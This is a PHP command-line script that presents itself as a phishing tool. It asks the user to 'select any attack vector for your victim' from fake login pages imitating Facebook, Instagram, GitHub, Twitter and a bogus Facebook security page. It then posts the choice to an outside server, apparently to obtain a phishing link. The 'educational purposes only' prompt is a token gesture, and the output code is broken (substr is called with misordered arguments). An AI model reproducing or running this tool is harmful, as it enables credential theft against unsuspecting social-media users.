<?php 
$site;
$page;
$x;
echo "\n\n___   _  _   ___   ___  __      ___  ___ \n"; 
echo "|\_|/ |\/|   !__  | _  √__\     |__| |  \n";
echo "|__|  |  |_  !__  |__] |  |     |    |__    \n\n";
function get(){
    echo "------------------------------------------\n";
    echo "SELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n";
    echo "------------------------------------------\n";
    echo "[1]FB_Standard             [2]Instagram_Web\n";
    echo "[3]Github                  [4]InstaFollowers\n";
    echo "[5]FB_Security_Fake        [6]Twitter\n\n";
    echo "[?]Your Input:         ";
	$site= trim(fgets(STDIN));
	
	if($site==1){
	   $page=  "facebook_standard";
	}
	else if($site==2){
		$page= "instagram_web";
	}
	else if($site==3){
		$page= "github";
	}
	else if($site==4){
	    $page="instafollowers";
	}
	else if($site==5){
	    $page="fb_security_fake";
	}
	else if($site==6){
	    $page="twitter";
	}
	else{
	echo "[!]Please Enter Correct Option And Run Again\n";
	echo "-------------------------------------------------------\n";
	
	exit();
	}
	echo "\n[?]Do you agree to use this tool for educational purposes only[Y/N]:   ";
 	$decision= trim(fgets(STDIN));
    $x="&site=".$page;
    if($decision=="y" || $decision=="Y" ){
    send($x);
    }
   else if($decision=="n" || $decision=="N"){
    die("\n[#]Yeah! Sure As You Wish\n");   
   }
   else{
    die("\n[!]Not A correct Input\n");
    }

    }


    
    function send($y){
    $z = curl_init();
    curl_setopt($z, CURLOPT_URL,"https://pkcinc.ml/newfile.php");
    curl_setopt($z, CURLOPT_POSTFIELDS,$y);
    $data = curl_exec($z);
    if ($data==""){
    echo "\n------------------------------------------\n";
    echo "[!]Please Check Your Internet Connection.";
    echo "\n------------------------------------------\n";
    }
    echo substr(0,1,$data);
    echo "\n";
    $deci= trim(fgets(STDIN));
    }


get();

?>